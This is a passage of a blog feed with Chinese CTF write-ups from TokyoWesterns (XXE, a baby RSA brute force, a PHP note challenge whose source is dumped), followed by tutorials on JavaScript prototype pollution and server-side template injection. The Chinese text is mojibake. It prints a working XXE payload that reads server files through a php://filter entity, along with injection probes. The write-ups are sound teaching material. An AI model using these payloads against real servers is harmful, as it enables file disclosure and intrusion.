id=&quot;json&quot; name=&quot;json&quot; rows=&quot;50&quot; cols=&quot;80&quot;&gt;    &lt;/textarea&gt;    &lt;input type=&quot;button&quot; id=&quot;x2j&quot; value=&quot;&lt;-&quot;/&gt;    &lt;input type=&quot;button&quot; id=&quot;j2x&quot; value=&quot;-&gt;&quot;/&gt;    &lt;textarea id=&quot;xml&quot; name=&quot;xml&quot; rows=&quot;50&quot; cols=&quot;80&quot;&gt;    &lt;/textarea&gt;    &lt;script      src=&quot;https://code.jquery.com/jquery-3.2.1.min.js&quot;      integrity=&quot;sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=&quot;      crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;    &lt;script&gt;      $.get(&apos;/sample.json&apos;, function(data) {        $(&apos;#json&apos;).val(data);      }, &apos;text&apos;);      $(&apos;#j2x&apos;).on(&apos;click&apos;, function() {        $.post(&apos;/&apos;, {          json: $(&apos;#json&apos;).val()        }, function(data) {          $(&apos;#xml&apos;).val(data);        });      });      $(&apos;#x2j&apos;).on(&apos;click&apos;, function() {        $.post(&apos;/&apos;, {          xml: $(&apos;#xml&apos;).val()        }, function(data) {          $(&apos;#json&apos;).val(data);        });      });    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>è¯»flag</p><pre><code>&lt;?xml version=&apos;1.0&apos;?&gt;&lt;!DOCTYPE mail[&lt;!ENTITY hacker SYSTEM &quot;php://filter/convert.base64-encode/resource=flag.php&quot;&gt;]&gt;&lt;mail&gt;    &lt;message&gt;&amp;hacker;&lt;/message&gt;&lt;/mail&gt;</code></pre><p>è§£å¯†å³å¯<br>    {<br>        â€œmessageâ€: â€œPD9waHAKJGZsYWcgPSAnVFdDVEZ7dDFueV9YWEVfc3QxbGxfZXgxc3RzX2V2ZXJ5d2hlcmV9JzsKâ€<br>    }</p><pre><code>$flag = &apos;TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}&apos;;</code></pre><h2 id="real-baby-rsa"><a href="#real-baby-rsa" class="headerlink" title="real-baby-rsa"></a>real-baby-rsa</h2><p>å‘Šè¯‰äº†æˆ‘ä»¬N,eä»¥åŠæ‰€æœ‰åŠ å¯†åçš„å¯†æ–‡ï¼Œç›´æ¥çˆ†ç ´ã€‚(åšçš„æ—¶å€™åˆæ˜¯é‚£æ ·æƒ³çš„ï¼šæ€ä¹ˆå¯èƒ½è¿™ä¹ˆç®€å•ï¼(è¿™ä¹ˆç®€å•å¼€å§‹çš„æ—¶å€™è¿˜ä¸çŸ¥é“æ›¿æ¢æ‰æ¢è¡Œç¬¦ï¼Œæäº†åŠå¤©æ²¡åšæˆğŸ˜”(ï¼›â€²âŒ’`)))</p><pre><code>#flag = &apos;TWCTF{CENSORED}&apos;#print(flag)# Public ParametersN = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091e = 65537# Encrypt the flag!#for i in flag1:for char in flag:    print(pow(ord(char), e, N))</code></pre><p>è§£å¯†è„šæœ¬ï¼š</p><pre><code>import string#flag = &apos;TWCTF{CENSORED}&apos;flag = string.letters+string.digits+&quot;!@#$%^&amp;*()/{}_&quot;#print(flag)# Public ParametersN = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091e = 65537content = open(&quot;output&quot;).readlines()for line in content:    line = line.replace(&apos;\n&apos;, &apos;&apos;)    for char in flag:        #print char        #print(pow(ord(char), e, N))        m = pow(ord(char), e, N)        #print(m)        #print(line)        if str(m) == str(line):            #print(m)            print(char),            break</code></pre><p>å†è´´ä¸€ä¸ªå›½å¤–å¸ˆå‚…å†™çš„ï¼Œçœ‹èµ·æ¥å°±æ˜¯æ¯”ä¸Šé¢çš„ä¼˜é›…ä¸€ç‚¹ğŸ˜€ï¼Œåˆ«é—®ä¸ºä»€ä¹ˆè´´ä¸¤ä¸ªï¼Ÿé—®å°±æ˜¯å–œæ¬¢æ”¶é›†ï¼</p><pre><code>N = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091e = 65537#create ist ascii charlist_ascii = []for i in range(33,126):    list_ascii.append(chr(i))#read each part of cipher text in to listlineList = list()lineList = [line.rstrip(&apos;\n&apos;) for line in open(&quot;output&quot;)]#starting burte forcemesg = &quot;&quot;for cir in range(0,len(lineList)):    for m in list_ascii:        test_str = pow(ord(m),e,N)        test_str = str(test_str)        if(lineList[cir] in test_str):            mesg += m            breakprint(mesg)</code></pre><h2 id="php-note"><a href="#php-note" class="headerlink" title="php-note"></a>php-note</h2><pre><code>first name :1lastname: {{2*2}}</code></pre><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g6vh6ett6fj30pe0d1wep.jpg" alt="ç™»é™†æˆåŠŸ"></p><p>æŸ¥çœ‹æºç å¾—åˆ°hint:<code>http://phpnote.chal.ctf.westerns.tokyo/?action=source</code></p><p>è¯»æºç </p><pre><code> &lt;?phpinclude &apos;config.php&apos;;class Note {    public function __construct($admin) {        $this-&gt;notes = array();        $this-&gt;isadmin = $admin;    }    public function addnote($title, $body) {        array_push($this-&gt;notes, [$title, $body]);    }    public function getnotes() {        return $this-&gt;notes;    }    public function getflag() {        if ($this-&gt;isadmin === true) {            echo FLAG;        }    }}function verify($data, $hmac) {    $secret = $_SESSION[&apos;secret&apos;];    if (empty($secret)) return false;    return hash_equals(hash_hmac(&apos;sha256&apos;, $data, $secret), $hmac);}function hmac($data) {    $secret = $_SESSION[&apos;secret&apos;];    if (empty($data) || empty($secret)) return false;    return hash_hmac(&apos;sha256&apos;, $data, $secret);}function gen_secret($seed) {    return md5(SALT . $seed . PEPPER);}function is_login() {    return !empty($_SESSION[&apos;secret&apos;]);}function redirect($action) {    header(&quot;Location: /?action=$action&quot;);    exit();}$method = $_SERVER[&apos;REQUEST_METHOD&apos;];$action = $_GET[&apos;action&apos;];if (!in_array($action, [&apos;index&apos;, &apos;login&apos;, &apos;logout&apos;, &apos;post&apos;, &apos;source&apos;, &apos;getflag&apos;])) {    redirect(&apos;index&apos;);}if ($action === &apos;source&apos;) {    highlight_file(__FILE__);    exit();}session_start();if (is_login()) {    $realname = $_SESSION[&apos;realname&apos;];    $nickname = $_SESSION[&apos;nickname&apos;];    $note = verify($_COOKIE[&apos;note&apos;], $_COOKIE[&apos;hmac&apos;])            ? unserialize(base64_decode($_COOKIE[&apos;note&apos;]))            : new Note(false);}if ($action === &apos;login&apos;) {    if ($method === &apos;POST&apos;) {        $nickname = (string)$_POST[&apos;nickname&apos;];        $realname = (string)$_POST[&apos;realname&apos;];        if (empty($realname) || strlen($realname) &lt; 8) {            die(&apos;invalid name&apos;);        }        $_SESSION[&apos;realname&apos;] = $realname;        if (!empty($nickname)) {            $_SESSION[&apos;nickname&apos;] = $nickname;        }        $_SESSION[&apos;secret&apos;] = gen_secret($nickname);    }    redirect(&apos;index&apos;);}if ($action === &apos;logout&apos;) {    session_destroy();    redirect(&apos;index&apos;);}if ($action === &apos;post&apos;) {    if ($method === &apos;POST&apos;) {        $title = (string)$_POST[&apos;title&apos;];        $body = (string)$_POST[&apos;body&apos;];        $note-&gt;addnote($title, $body);        $data = base64_encode(serialize($note));        setcookie(&apos;note&apos;, (string)$data);        setcookie(&apos;hmac&apos;, (string)hmac($data));    }    redirect(&apos;index&apos;);}if ($action === &apos;getflag&apos;) {    $note-&gt;getflag();}?&gt;&lt;!doctype html&gt;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;PHP note&lt;/title&gt;    &lt;/head&gt;    &lt;style&gt;        textarea {            resize: none;            width: 300px;            height: 200px;        }    &lt;/style&gt;    &lt;body&gt;        &lt;?php        if (!is_login()) {            $realname = htmlspecialchars($realname);            $nickname = htmlspecialchars($nickname);        ?&gt;        &lt;form action=&quot;/?action=login&quot; method=&quot;post&quot; id=&quot;login&quot;&gt;            &lt;input type=&quot;text&quot; id=&quot;firstname&quot; placeholder=&quot;First Name&quot;&gt;            &lt;input type=&quot;text&quot; id=&quot;lastname&quot; placeholder=&quot;Last Name&quot;&gt;            &lt;input type=&quot;text&quot; name=&quot;nickname&quot; id=&quot;nickname&quot; placeholder=&quot;nickname&quot;&gt;            &lt;input type=&quot;hidden&quot; name=&quot;realname&quot; id=&quot;realname&quot;&gt;            &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;        &lt;/form&gt;        &lt;?php        } else {        ?&gt;        &lt;h1&gt;Welcome, &lt;?=$realname?&gt;&lt;?= !empty($nickname) ? &quot; ($nickname)&quot; : &quot;&quot; ?&gt;&lt;/h1&gt;        &lt;a href=&quot;/?action=logout&quot;&gt;logout&lt;/a&gt;        &lt;!-- &lt;a href=&quot;/?action=source&quot;&gt;source&lt;/a&gt; --&gt;        &lt;br/&gt;        &lt;br/&gt;        &lt;?php            foreach($note-&gt;getnotes() as $k =&gt; $v) {                list($title, $body) = $v;                $title = htmlspecialchars($title);                $body = htmlspecialchars($body);        ?&gt;        &lt;h2&gt;&lt;?=$title?&gt;&lt;/h2&gt;        &lt;p&gt;&lt;?=$body?&gt;&lt;/p&gt;        &lt;?php            }        ?&gt;        &lt;form action=&quot;/?action=post&quot; method=&quot;post&quot;&gt;            &lt;input type=&quot;text&quot; name=&quot;title&quot; placeholder=&quot;title&quot;&gt;            &lt;br&gt;            &lt;textarea name=&quot;body&quot; placeholder=&quot;body&quot;&gt;&lt;/textarea&gt;            &lt;button type=&quot;submit&quot;&gt;Post&lt;/button&gt;        &lt;/form&gt;        &lt;?php        }        ?&gt;        &lt;?php        ?&gt;        &lt;script&gt;            document.querySelector(&quot;form#login&quot;).addEventListener(&apos;submit&apos;, (e) =&gt; {                const nickname = document.querySelector(&quot;input#nickname&quot;)                const firstname = document.querySelector(&quot;input#firstname&quot;)                const lastname = document.querySelector(&quot;input#lastname&quot;)                document.querySelector(&quot;input#realname&quot;).value = `${firstname.value} ${lastname.value}`                if (nickname.value.length == 0 &amp;&amp; firstname.value.length &gt; 0 &amp;&amp; lastname.value.length &gt; 0) {                    nickname.value = firstname.value.toLowerCase()[0] + lastname.value.toLowerCase()                }            })        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt; </code></pre><p>æ²¡åšå®Œï¼Œå…ˆç•™å‘</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript Prototype æ±¡æŸ“æ”»å‡»</title>
      <link href="/2019/08/31/JavaScript%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93/"/>
      <url>/2019/08/31/JavaScript%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<p>JSçœŸæœ‰è¶£ï¼</p><a id="more"></a><h1 id="JavaScript-Prototype-æ±¡æŸ“æ”»å‡»"><a href="#JavaScript-Prototype-æ±¡æŸ“æ”»å‡»" class="headerlink" title="JavaScript Prototype æ±¡æŸ“æ”»å‡»"></a>JavaScript Prototype æ±¡æŸ“æ”»å‡»</h1><h2 id="JSåŸºæœ¬è¯­æ³•"><a href="#JSåŸºæœ¬è¯­æ³•" class="headerlink" title="JSåŸºæœ¬è¯­æ³•"></a>JSåŸºæœ¬è¯­æ³•</h2><h3 id="è¾“å‡º"><a href="#è¾“å‡º" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h3><ul><li><p>window.alert();å¼¹å‡ºè­¦å‘Šæ¡†</p></li><li><p>console.log();å°†å†…å®¹å†™åˆ°æ§åˆ¶å°</p><p>  a = 5;<br>  b = 6;<br>  c = a + b;<br>  console.log(c);<br>  11 debugger eval code:1:9<br>  undefined</p></li></ul><h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><p>JSä½¿ç”¨å¯¹è±¡(Object)å®šä¹‰ä¸€ä¸ªå¯¹è±¡</p><pre><code>var person = {firstname:&quot;John&quot;,lastname:&quot;Doe&quot;};personObject { firstname: &quot;John&quot;, lastname: &quot;Doe&quot; }</code></pre><p>JSè¯­å¥å¯ä»¥å†™åœ¨å‡½æ•°å†…ï¼Œå‡½æ•°å¯ä»¥é‡å¤å¼•ç”¨ï¼š<strong>å¼•ç”¨ä¸€ä¸ªå‡½æ•°</strong> = è°ƒç”¨å‡½æ•°(æ‰§è¡Œå‡½æ•°å†…çš„è¯­å¥)</p><pre><code>function myFuncion(a,b) {  return a * b;}myFuncion(2,3)6</code></pre><p>JSå¤§å°å†™æ•æ„Ÿ</p><h3 id="å¯¹è±¡"><a href="#å¯¹è±¡" class="headerlink" title="å¯¹è±¡"></a>å¯¹è±¡</h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å®šä¹‰å˜é‡æ¥åˆ›å»ºå¯¹è±¡</p><pre><code>var car = {type:&quot;tzla&quot;,modle:500,color:&quot;white&quot;};</code></pre><p>è¿™é‡Œï¼Œ3ä¸ªå€¼<code>{&quot;tzle&quot;,500,&quot;white&quot;}</code>èµ‹äºˆå˜é‡carã€3ä¸ªå˜é‡<code>{type,modle,color}</code>èµ‹äºˆå˜é‡car.</p><p>é€šå¸¸è®¤ä¸ºJSå¯¹è±¡æ˜¯é”®å€¼å¯¹çš„å®¹å™¨ã€‚</p><p>æˆ‘ä»¬æœ‰ä¸¤ç§æ–¹å¼è®¿é—®å¯¹è±¡å±æ€§</p><pre><code>car.modle;car[&quot;modle&quot;];</code></pre><p>å¯¹è±¡çš„æ–¹æ³•å®šä¹‰äº†ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶ä½œä¸ºå¯¹è±¡çš„å±æ€§å­˜å‚¨</p><pre><code>var person = {    firstName: &quot;John&quot;,    lastName : &quot;Doe&quot;,    id : 5566,    fullName : function()     {       return this.firstName + &quot; &quot; + this.lastName;    }};</code></pre><p>å¯¹è±¡æ–¹æ³•é€šè¿‡æ·»åŠ ()è°ƒç”¨(ä½œä¸ºä¸€ä¸ªå‡½æ•°)ã€‚</p><pre><code>name = person.fullName();</code></pre><p>å¦‚æœè®¿é—®personå¯¹è±¡çš„fullNameå±æ€§ï¼Œ<code>name = person.fullName;</code> ä»–å°†ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²è¿”å›ã€‚</p><h2 id="prototype-å’Œ-proto-åˆ†åˆ«æ˜¯ä»€ä¹ˆ"><a href="#prototype-å’Œ-proto-åˆ†åˆ«æ˜¯ä»€ä¹ˆ" class="headerlink" title="prototype å’Œ __proto__ åˆ†åˆ«æ˜¯ä»€ä¹ˆ"></a><code>prototype</code> å’Œ <code>__proto__</code> åˆ†åˆ«æ˜¯ä»€ä¹ˆ</h2><p>æˆ‘ä»¬ä»¥æ„é€ å‡½æ•°çš„æ–¹å¼æ¥å®šä¹‰ä¸€ä¸ªç±»</p><pre><code>function Foo() {    this.bar = 1}new Foo()</code></pre><p>Fooå‡½æ•°çš„å†…å®¹å°±æ˜¯Fooç±»çš„æ„é€ å‡½æ•°,è€Œthis.barå°±æ˜¯Fooç±»çš„ä¸€ä¸ªå±æ€§ã€‚</p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥å°†æ–¹æ³•å®šä¹‰åœ¨æ„é€ å‡½æ•°å†…éƒ¨ï¼š</p><pre><code>function Foo() {    this.bar = 1    this.show = function() {    console.log(this.bar)    }}(new Foo()).show()</code></pre><p>ä½†æ˜¯è¿™æ ·çš„é—®é¢˜æ˜¯æ¯å½“æˆ‘ä»¬æ–°å»ºä¸€ä¸ªFooå¯¹è±¡æ—¶ï¼Œthis.show = functionâ€¦å°±ä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œè¿™ä¸ªshowæ–¹æ³•å®é™…ä¸Šæ˜¯ç»‘å®šåœ¨å¯¹è±¡ä¸Šçš„ï¼Œè€Œä¸æ˜¯ç»‘å®šåœ¨â€ç±»â€ä¸­ã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨åŸå‹(prototype)æ¥å®ç°åœ¨åˆ›å»ºç±»çš„æ—¶å€™åªåˆ›å»ºä¸€æ¬¡showæ–¹æ³•ï¼š</p><pre><code>function Foo() {    this.bar = 1}Foo.prototype.show = function show() {  console.log(this.bar)}let foo = new Foo()foo.show()</code></pre><p>fooå¯ä»¥è°ƒç”¨<code>show</code>æ–¹æ³•æ¥è¾“å‡ºç»“æœ<code>1</code>ã€‚</p><p>æˆ‘ä»¬å¯ä»¥è®¤ä¸º<code>prototype</code>æ˜¯ç±»<code>Foo</code>çš„ä¸€ä¸ªå±æ€§ï¼Œè€Œæ‰€æœ‰Fooç±»å®ä¾‹åŒ–å‡ºæ¥çš„å¯¹è±¡éƒ½å°†æ‹¥æœ‰è¿™ä¸ªå±æ€§ä¸­çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬å˜é‡å’Œæ–¹æ³•ï¼Œå°±åƒfooå…·æœ‰<code>foo.show()</code>æ–¹æ³•ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡prototypeæ¥è®¿é—®Fooç±»çš„åŸå‹ï¼Œä½†æ˜¯Fooç±»å®ä¾‹åŒ–å‡ºæ¥çš„å¯¹è±¡æ˜¯ä¸èƒ½è®¿é—®åŸå‹çš„ï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨åˆ°<code>__proto__</code>ã€‚</p><p>ä¸€ä¸ªFooç±»å®ä¾‹åŒ–å‡ºæ¥çš„å¯¹è±¡æ˜¯å¯ä»¥é€šè¿‡foo.<strong>proto</strong>å±æ€§æ¥è®¿é—®Fooç±»çš„åŸå‹ï¼š</p><pre><code>foo.__proto__Object { show: show(), â€¦ }Foo.prototypeObject { show: show(), â€¦ }Foo.prototype === foo.__proto__ true</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258679/1560690468868-ed7f7f4f-6356-49eb-bb93-8f73aea44ae0.png#align=left&display=inline&height=209&name=image.png&originHeight=418&originWidth=952&size=54718&status=done&width=476" alt="äºŒè€…çš„å…³ç³»"></p><p>äºæ˜¯æˆ‘ä»¬çŸ¥é“ï¼š</p><ol><li><code>prototype</code>æ˜¯ä¸€ä¸ªç±»çš„å±æ€§ï¼Œæ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰<code>prototype</code>ä¸­çš„å±æ€§å’Œæ–¹æ³•</li><li>ä¸€ä¸ªå¯¹è±¡çš„<code>__proto__</code>å±æ€§æŒ‡å‘è¿™ä¸ªå¯¹è±¡æ‰€åœ¨ç±»çš„<code>prototype</code>å±æ€§</li></ol><h2 id="JavaScriptåŸå‹é“¾ç»§æ‰¿"><a href="#JavaScriptåŸå‹é“¾ç»§æ‰¿" class="headerlink" title="JavaScriptåŸå‹é“¾ç»§æ‰¿"></a>JavaScriptåŸå‹é“¾ç»§æ‰¿</h2><p>æ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰prototypeä¸­çš„å±æ€§å’Œæ–¹æ³•ï¼Œè¿™ä¸ªç‰¹æ€§è¢«ç”¨æ¥å®ç°JavaScriptä¸­çš„ç»§æ‰¿</p><pre><code>function Father() {    this.first_name = &apos;Donald&apos;    this.last_name = &apos;Trump&apos;}function Son() {    this.first_name = &apos;Melania&apos;}Son.prototype = new Father()let son = new Son()console.log(`Name: ${son.first_name} ${son.last_name}`)Name: Melania Trump</code></pre><p>åœ¨è°ƒç”¨<code>son.last_name</code>çš„æ—¶å€™ï¼ŒJavaScriptå¼•æ“åšäº†è¿™äº›äº‹ï¼š</p><ol><li>åœ¨å¯¹è±¡<code>son</code>ä¸­å¯»æ‰¾<code>last_name</code></li><li>å¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™åœ¨<code>son.__proto__</code>ä¸­å¯»æ‰¾<code>last_name</code></li><li>å¦‚æœä»ç„¶æ‰¾ä¸åˆ°ï¼Œåˆ™åœ¨<code>son.__proto__.__proto__</code>ä¸­å¯»æ‰¾<code>last_name</code></li><li>ä¸€æ¬¡å¯»æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°<code>Null</code>ç»“æŸã€‚<code>Object.prototype</code>çš„<code>__proto__</code>å°±æ˜¯<code>null</code>ï¼Œå› æ­¤<code>Object</code>æ˜¯æ‰€æœ‰åŸå‹é“¾çš„æœ€é¡¶å±‚ã€‚</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258679/1560691466319-0c780440-b626-4d58-a3c0-315ccc5c3210.png#align=left&display=inline&height=444&name=image.png&originHeight=888&originWidth=1110&size=127913&status=done&width=555" alt></p><p>äºæ˜¯æˆ‘ä»¬çŸ¥é“ï¼š</p><ol><li>æ¯ä¸ªæ„é€ å‡½æ•°(constructor)éƒ½å«æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡<code>prototype</code></li><li>å¯¹è±¡çš„<code>__proto__</code>å±æ€§ï¼ŒæŒ‡å‘ç±»çš„åŸå‹å¯¹è±¡<code>prototype</code></li><li><code>JavaScript</code>ä½¿ç”¨<code>prototype</code>é“¾å®ç°ç»§æ‰¿æœºåˆ¶</li></ol><h2 id="ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“"><a href="#ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“"></a>ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“</h2><p>ç”±ä¸Šæ–‡æˆ‘ä»¬å¯ä»¥çŸ¥é“<code>foo.__proto__</code>æŒ‡å‘çš„æ˜¯<code>Foo</code>ç±»çš„<code>prototype</code>.é‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬ä¿®æ”¹äº†<code>foo.__proto__</code>ä¸­çš„å€¼ï¼Œå°±å¯ä»¥ä¿®æ”¹<code>Foo</code>ç±».</p><p>åŒæ—¶æˆ‘ä»¬ä¹ŸçŸ¥é“æˆ‘ä»¬æœ‰ä¸¤ç§æ–¹å¼å»è®¿é—®å¯¹è±¡çš„å±æ€§ï¼Œå½“æˆ‘ä»¬é€šè¿‡æŒ‡å®šä¸‹æ ‡çš„æ–¹å¼å»è®¿é—®çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>b[&quot;__proto__&quot;]</code>çš„æ–¹å¼å»è®¿é—®å…¶åŸå‹å¯¹è±¡</p><pre><code>a = []b = []b[&quot;__proto__&quot;][&quot;admintoken&quot;]=&quot;123456&quot;;a.admintoken&quot;123456&quot;</code></pre><p>åœ¨ä¸€ä¸ªåº”ç”¨ä¸­ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯<strong>åŸå‹é“¾æ±¡æŸ“</strong>ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI-æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥</title>
      <link href="/2019/08/30/SSTI/"/>
      <url>/2019/08/30/SSTI/</url>
      
        <content type="html"><![CDATA[<p>ç»ˆäºåˆ°äº†å­¦ä¹ SSTIçš„æ—¶é—´å‘¢ï¼</p><a id="more"></a><h1 id="SSTI-æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥"><a href="#SSTI-æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥" class="headerlink" title="SSTI-æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥"></a>SSTI-æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥</h1><p>8/30/2019 3:28:13 PM </p><h2 id="æ³¨å…¥åŸç†"><a href="#æ³¨å…¥åŸç†" class="headerlink" title="æ³¨å…¥åŸç†"></a>æ³¨å…¥åŸç†</h2><p>ä½¿ç”¨PHPæ¨¡æ¿å¼•æ“Twigä½œä¾‹å­æ¼”ç¤ºæ³¨å…¥åŸç†</p><pre><code>&lt;?phprequire_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;Twig_Autoloader::register(true);$twig = new Twig_Environment(new Twig_Loader_String());$output = $twig-&gt;render(&quot;Hello {{name}}&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;]));  // å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºæ¨¡ç‰ˆå˜é‡çš„å€¼echo $output;</code></pre><blockquote><p>In this example the user controls the content of the template itself via the custom_email GET parameter, rather than a value passed into it. </p></blockquote><p><code></code>æ¨¡æ¿å˜é‡å€¼ä½œä¸ºå‚æ•°æ¥è‡ªäº<code>GET</code>è¯·æ±‚<code>$_GET[&quot;name&quot;]</code>ã€‚è¿™æ®µä»£ç æ²¡ä»€ä¹ˆé—®é¢˜ã€‚æ¨¡æ¿å¼•æ“é»˜è®¤ä¼šå¯¹æ¸²æŸ“çš„å˜é‡å€¼è¿›è¡Œç¼–ç å’Œè½¬ä¹‰ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šé€ æˆ<code>XSS</code>ç­‰ã€‚</p><p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¿®æ”¹ä»£ç </p><pre><code>&lt;?phprequire_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;Twig_Autoloader::register(true);$twig = new Twig_Environment(new Twig_Loader_String());$output = $twig-&gt;render(&quot;Hello {$_GET[&apos;name&apos;]}&quot;);  // å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºæ¨¡ç‰ˆå†…å®¹çš„ä¸€éƒ¨åˆ†echo $output;</code></pre><p>æˆ‘ä»¬å°†<code>GET</code>çš„å‚æ•°ç›´æ¥ä½œä¸ºæ¨¡æ¿çš„å†…å®¹ï¼Œä¸å†å¯¹å…¶è¿›è¡Œç¼–ç å’Œè½¬ä¹‰äº†åˆ™å¾ˆå®¹æ˜“å‡ºç°æ”»å‡»ç‚¹ã€‚äºæ˜¯æˆ‘ä»¬çŸ¥é“æ¼æ´çš„åŸå› æ˜¯æœåŠ¡å™¨ç«¯ç›¸ä¿¡äº†ç”¨æˆ·çš„è¾“å…¥ã€‚</p><h2 id="æ£€æµ‹"><a href="#æ£€æµ‹" class="headerlink" title="æ£€æµ‹"></a>æ£€æµ‹</h2><p>å¦‚ä½•åˆ¤æ–­æ˜¯å¦å­˜åœ¨<code>SSTI</code>ï¼Ÿ</p><p>æˆ‘ä»¬è¿˜ä»¥ä¸Šé¢çš„ä»£ç ä¸ºä¾‹ï¼š</p><pre><code>&lt;?phprequire_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;Twig_Autoloader::register(true);$twig = new Twig_Environment(new Twig_Loader_String());$output = $twig-&gt;render(&quot;Hello {$_GET[&apos;name&apos;]}&quot;);  // å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºæ¨¡ç‰ˆå†…å®¹çš„ä¸€éƒ¨åˆ†echo $output;</code></pre><p>åœ¨Twingæ¨¡æ¿å¼•æ“é‡Œ<code></code>ä¸ä»…å¯ä»¥è¾“å‡ºä¼ é€’çš„å˜é‡å¤–ï¼Œè¿˜èƒ½æ‰§è¡Œä¸€äº›åŸºæœ¬çš„è¡¨è¾¾å¼ç„¶åå°†å…¶ä½œä¸ºæ¨¡æ¿å˜é‡çš„å€¼ã€‚æˆ‘ä»¬è¾“å…¥<code>name=20</code>,æœåŠ¡ç«¯å¾—åˆ°å†…å®¹ä¸º <code>Hello 20</code>ï¼Œä¼šè¾“å‡º <code>Hello 20</code>.</p><p>æˆ‘ä»¬ç°åœ¨ä¿®æ”¹æ•°æ®ä¸º</p><pre><code>IsVlun{{2*8}}OK</code></pre><p>æœåŠ¡å™¨ç«¯æ”¶åˆ°å†…å®¹ä¸º</p><pre><code>Hello 